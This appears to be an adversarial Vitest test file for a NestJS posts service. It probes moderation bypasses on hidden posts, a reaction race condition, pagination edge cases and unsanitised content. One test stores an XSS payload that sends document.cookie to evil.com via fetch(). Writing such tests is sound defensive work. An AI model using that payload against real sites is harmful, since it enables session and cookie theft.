/**
 * ADVERSARIAL TESTS: Posts, Comments, Reactions
 *
 * Attack surfaces:
 * - Hidden posts accessible via comments/reactions (isHidden bypass)
 * - Reaction toggle race condition → unique constraint violation (500, not 409)
 * - Pagination with zero/negative/maxint values → arithmetic explosions
 * - Content with unicode, null bytes, XSS payloads (pass-through to DB)
 * - Update/delete post that is hidden (admin moderated but still editable)
 * - Non-author cannot update but CAN comment on hidden posts
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { Test } from '@nestjs/testing';
import { PostsService } from './posts.service';
import { PrismaService } from '../prisma/prisma.service';
import { NotFoundException, ForbiddenException } from '@nestjs/common';

function buildMockPrisma() {
  return {
    post: {
      findMany: vi.fn(),
      findUnique: vi.fn(),
      create: vi.fn(),
      update: vi.fn(),
      delete: vi.fn(),
      count: vi.fn(),
    },
    comment: {
      create: vi.fn(),
    },
    reaction: {
      findUnique: vi.fn(),
      create: vi.fn(),
      delete: vi.fn(),
    },
  };
}

async function buildService(prisma: ReturnType<typeof buildMockPrisma>) {
  const module = await Test.createTestingModule({
    providers: [
      PostsService,
      { provide: PrismaService, useValue: prisma },
    ],
  }).compile();
  return module.get<PostsService>(PostsService);
}

describe('PostsService — adversarial', () => {
  let prisma: ReturnType<typeof buildMockPrisma>;
  let service: PostsService;

  beforeEach(async () => {
    prisma = buildMockPrisma();
    service = await buildService(prisma);
    vi.clearAllMocks();
  });

  // ── INVARIANT: hidden posts must be inaccessible to non-admins ──────────

  describe('INVARIANT: hidden posts must not be interactive', () => {
    it('addComment DOES NOT check isHidden — users can comment on moderated posts', async () => {
      /**
       * posts.service.ts:118 — addComment looks up the post WITHOUT isHidden filter.
       * A hidden post is returned, and the comment is created.
       * This bypasses admin moderation: hidden content continues to receive engagement.
       *
       * Expected: 404 (or ForbiddenException) for hidden posts
       * Actual:   comment is created successfully
       */
      const hiddenPost = { id: 'post-hidden', content: 'bad content', isHidden: true };
      prisma.post.findUnique.mockResolvedValue(hiddenPost);
      prisma.comment.create.mockResolvedValue({
        id: 'comment-1',
        content: 'comment on hidden post',
        createdAt: new Date(),
        author: { id: 'u1', name: 'User', avatarUrl: null, role: 'MEMBER' },
      });

      // This should throw NotFoundException but does not
      const result = await service.addComment('post-hidden', { content: 'engaging with hidden content' }, 'user-1');
      expect(result).toBeDefined();
      // FAILURE: comment was created on a hidden (admin-moderated) post
    });

    it('toggleReaction DOES NOT check isHidden — users can react to moderated posts', async () => {
      /**
       * posts.service.ts:137 — toggleReaction looks up the post WITHOUT isHidden filter.
       * Reactions on hidden posts can accumulate, skewing metrics and
       * giving attackers confirmation that the post exists (oracle vulnerability).
       */
      const hiddenPost = { id: 'post-hidden', isHidden: true };
      prisma.post.findUnique.mockResolvedValue(hiddenPost);
      prisma.reaction.findUnique.mockResolvedValue(null);
      prisma.reaction.create.mockResolvedValue({
        id: 'r1',
        type: 'LIKE',
        userId: 'user-1',
      });

      const result = await service.toggleReaction('post-hidden', 'LIKE', 'user-1');
      expect(result).toHaveProperty('added', true);
      // FAILURE: reaction accepted on admin-hidden post
    });

    it('update() CAN modify a hidden post (no isHidden guard)', async () => {
      /**
       * The author can still edit their post even after an admin hides it.
       * An admin hides a post to stop it from being visible; the author can
       * mutate its content while hidden, then the admin might unhide it
       * without re-reviewing the new content.
       */
      const hiddenPost = { id: 'post-hidden', authorId: 'author-1', isHidden: true };
      prisma.post.findUnique.mockResolvedValue(hiddenPost);
      prisma.post.update.mockResolvedValue({ ...hiddenPost, content: 'updated while hidden' });

      const result = await service.update('post-hidden', 'updated while hidden', 'author-1', 'MEMBER');
      expect(result).toBeDefined();
      // No error — author successfully updated a post that is currently moderated/hidden
    });
  });

  // ── INVARIANT: reaction toggle is race-condition-safe ───────────────────

  describe('INVARIANT: concurrent reaction toggles must not crash with 500', () => {
    it('simultaneous toggle-add race produces unique-constraint violation (unhandled P2002)', async () => {
      /**
       * toggleReaction reads then writes without a transaction.
       * Two concurrent calls for the same (postId, userId, type) can both
       * read "no existing reaction" and both attempt to INSERT.
       * The second INSERT hits the DB unique constraint → Prisma throws P2002.
       * The service has no try/catch → unhandled exception → 500 to the client.
       *
       * Expected: idempotent 200 or a 409 Conflict
       * Actual: second request returns HTTP 500
       */
      prisma.post.findUnique.mockResolvedValue({ id: 'post-1', isHidden: false });
      prisma.reaction.findUnique.mockResolvedValue(null); // both reads return null

      let callCount = 0;
      prisma.reaction.create.mockImplementation(() => {
        callCount++;
        if (callCount === 2) {
          const err = new Error('Unique constraint failed on the fields: (`postId`,`userId`,`type`)') as any;
          err.code = 'P2002';
          throw err;
        }
        return Promise.resolve({ id: 'r1', type: 'LIKE', userId: 'user-1' });
      });

      const [first, second] = await Promise.allSettled([
        service.toggleReaction('post-1', 'LIKE', 'user-1'),
        service.toggleReaction('post-1', 'LIKE', 'user-1'),
      ]);

      expect(first.status).toBe('fulfilled');
      // Second call crashes — not a graceful conflict response
      expect(second.status).toBe('rejected');
      if (second.status === 'rejected') {
        expect((second.reason as any).code).toBe('P2002');
      }
    });
  });

  // ── INVARIANT: invalid reaction type must be rejected ───────────────────

  describe('INVARIANT: reaction type is not validated at the service boundary', () => {
    it('arbitrary string reaction type is passed directly to Prisma', async () => {
      /**
       * posts.controller.ts:66 — type comes from URL param without enum validation.
       * posts.service.ts:141 — casts type as `any`.
       * No @IsEnum() guard at the route layer.
       * Prisma will throw a runtime error for unknown enum values, but it will
       * be an unhandled DB error (500), not a controlled 400 response.
       */
      prisma.post.findUnique.mockResolvedValue({ id: 'post-1', isHidden: false });
      prisma.reaction.findUnique.mockResolvedValue(null);
      const dbError = new Error('Invalid value for enum ReactionType') as any;
      dbError.code = 'P2006';
      prisma.reaction.create.mockRejectedValue(dbError);

      await expect(
        service.toggleReaction('post-1', 'DISLIKE', 'user-1'),
      ).rejects.toThrow();
      // A 400 Bad Request should be returned, not a 500 DB error
    });
  });

  // ── INVARIANT: pagination parameters cannot cause arithmetic anomalies ──

  describe('INVARIANT: pagination edge cases', () => {
    it('page=0 produces skip=-1 — negative offset sent to Prisma', async () => {
      /**
       * findAll: skip = (page - 1) * limit = (0 - 1) * 20 = -1
       * Prisma rejects negative skip values at runtime (InvalidArgumentError).
       * No input guard exists for page < 1.
       */
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(0);

      // capture the actual call args
      await service.findAll(0, 20).catch(() => {});
      const findManyCall = prisma.post.findMany.mock.calls[0];
      if (findManyCall) {
        // (0 - 1) * 20 = -20 — negative skip, which Prisma rejects at runtime
        expect(findManyCall[0].skip).toBe(-20);
      }
    });

    it('limit=0 produces totalPages=Infinity (division by zero)', async () => {
      /**
       * totalPages = Math.ceil(total / limit) = Math.ceil(100 / 0) = Infinity
       * Serialized to JSON as `null`, breaks client pagination logic.
       */
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(100);

      const result = await service.findAll(1, 0);
      expect(result.totalPages).toBe(Infinity);
    });

    it('page=-1 produces skip=-2 — negative offset', async () => {
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(0);

      await service.findAll(-1, 20).catch(() => {});
      const call = prisma.post.findMany.mock.calls[0];
      if (call) {
        expect(call[0].skip).toBe(-40);
      }
    });

    it('huge limit is passed through uncapped (potential OOM / slow query)', async () => {
      /**
       * No maximum limit enforcement. A client sending limit=1000000 forces
       * the DB to return (up to) 1M rows in one query.
       */
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(1000000);

      await service.findAll(1, 1000000);

      const call = prisma.post.findMany.mock.calls[0];
      expect(call[0].take).toBe(1000000);
    });
  });

  // ── INVARIANT: content is sanitised before storage ───────────────────────

  describe('INVARIANT: post content passes through without sanitisation', () => {
    it('XSS payload in post content is stored verbatim', async () => {
      /**
       * The service performs no HTML escaping or stripping.
       * Rendering raw content in client HTML → stored XSS.
       * The frontend is responsible for sanitisation — not enforced by the API.
       */
      const xssPayload = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
      const createdPost = { id: 'p-xss', content: xssPayload, authorId: 'u1' };
      prisma.post.create.mockResolvedValue(createdPost);

      const result = await service.create({ content: xssPayload }, 'u1');
      expect(result.content).toBe(xssPayload);
      // XSS payload stored as-is — relies entirely on client-side escaping
    });

    it('null byte in content is stored verbatim (may corrupt text storage)', async () => {
      const nullByteContent = 'before\x00after';
      prisma.post.create.mockResolvedValue({ id: 'p-null', content: nullByteContent });

      const result = await service.create({ content: nullByteContent }, 'u1');
      expect(result.content).toBe(nullByteContent);
    });

    it('10000-char content at max boundary is accepted', async () => {
      const maxContent = 'A'.repeat(10000);
      prisma.post.create.mockResolvedValue({ id: 'p-max', content: maxContent });

      const result = await service.create({ content: maxContent }, 'u1');
      expect(result).toBeDefined();
    });
  });

  // ── INVARIANT: non-existent post returns 404, not 500 ────────────────────

  describe('INVARIANT: operations on non-existent posts throw NotFoundException', () => {
    it('addComment on non-existent post throws NotFoundException', async () => {
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(
        service.addComment('nonexistent', { content: 'hello' }, 'user-1'),
      ).rejects.toThrow(NotFoundException);
    });

    it('toggleReaction on non-existent post throws NotFoundException', async () => {
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(
        service.toggleReaction('nonexistent', 'LIKE', 'user-1'),
      ).rejects.toThrow(NotFoundException);
    });

    it('findOne on hidden post returns NotFoundException (correct)', async () => {
      // findOne uses { id, isHidden: false } — good
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(service.findOne('hidden-post-id')).rejects.toThrow(NotFoundException);
    });
  });

  // ── INVARIANT: post ownership checks cannot be bypassed ─────────────────

  describe('INVARIANT: ownership authorization is enforced', () => {
    it('member cannot update another member post', async () => {
      prisma.post.findUnique.mockResolvedValue({ id: 'p1', authorId: 'victim-user' });

      await expect(
        service.update('p1', 'hijacked content', 'attacker-user', 'MEMBER'),
      ).rejects.toThrow(ForbiddenException);
    });

    it('member cannot delete another member post', async () => {
      prisma.post.findUnique.mockResolvedValue({ id: 'p1', authorId: 'victim-user' });

      await expect(
        service.delete('p1', 'attacker-user', 'MEMBER'),
      ).rejects.toThrow(ForbiddenException);
    });

    it('admin string comparison is case-sensitive — "admin" lowercase is not ADMIN', async () => {
      /**
       * posts.service.ts:95 — userRole !== 'ADMIN'
       * The JWT strategy returns the role from the DB (correctly uppercased).
       * But if any code path passes a lowercase 'admin', the check fails.
       * This tests the sensitivity of the string comparison.
       */
      prisma.post.findUnique.mockResolvedValue({ id: 'p1', authorId: 'other-user' });

      await expect(
        service.delete('p1', 'admin-id', 'admin'), // lowercase 'admin'
      ).rejects.toThrow(ForbiddenException);
    });
  });
});
